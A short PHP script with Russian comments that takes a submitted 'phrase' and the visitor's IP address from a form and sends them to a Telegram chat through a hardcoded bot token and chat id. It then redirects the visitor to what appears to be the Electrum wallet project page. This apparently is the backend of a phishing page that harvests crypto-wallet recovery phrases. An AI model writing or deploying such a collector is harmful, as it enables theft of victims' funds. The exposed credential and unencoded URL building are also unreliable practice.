<?php
 
/* https://api.telegram.org/botXXXXXXXXXXXXXXXXXXXXXXX/getUpdates,
где, XXXXXXXXXXXXXXXXXXXXXXX - токен вашего бота, полученный ранее */
 
//Переменная $name,$phone, $mail получает данные при помощи метода POST из формы
$in = $_POST['in'];
$ip = $_SERVER['REMOTE_ADDR'];


//в переменную $token нужно вставить токен, который нам прислал @botFather
$token = "5588896938:AAHhgzw88vTL3NlTGpo2koCgQ63wPPBtifM";
 
//нужна вставить chat_id (Как получить chad id, читайте ниже)
$chat_id = "-713410256";
 
//Далее создаем переменную, в которую помещаем PHP массив
$arr = array(
  'Фраза пришла: ' => $in,
  'IP: ' => $ip,
);
 
//При помощи цикла перебираем массив и помещаем переменную $txt текст из массива $arr
foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};
 
//Осуществляется отправка данных в переменной $sendToTelegram
$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
 
//Если сообщение отправлено, напишет "Thank you", если нет - "Error"
if ($sendToTelegram) {
  header("Location: https://spesmilos.github.io/");
} else {
  echo "Error";
}
?>
